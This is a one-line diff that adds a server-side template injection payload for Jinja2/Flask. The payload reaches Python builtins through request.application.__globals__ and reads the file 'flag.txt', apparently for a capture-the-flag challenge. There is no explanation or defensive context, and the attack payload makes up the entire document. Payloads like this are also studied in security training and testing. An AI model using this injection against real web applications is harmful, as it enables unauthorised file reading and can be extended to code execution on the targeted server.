@@ -1,0 +1,1 @@
+{{request.application.__globals__.__builtins__.open('flag.txt').read()}}
